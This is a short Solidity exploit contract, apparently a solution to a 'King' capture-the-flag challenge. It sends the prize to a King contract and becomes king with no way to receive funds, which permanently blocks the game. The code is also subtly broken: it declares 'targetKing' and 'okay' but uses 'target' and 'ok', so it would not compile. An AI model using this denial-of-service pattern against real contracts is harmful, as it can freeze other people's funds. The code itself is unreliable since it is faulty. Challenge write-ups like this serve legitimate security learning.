// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./king.sol";

contract KingHack {

    constructor (address payable targetKing) payable {
        uint prize = King(target).prize();
        // low-level function
        (bool okay,) = target.call{value: prize} ("");
        require(ok, "call failed");
    }

}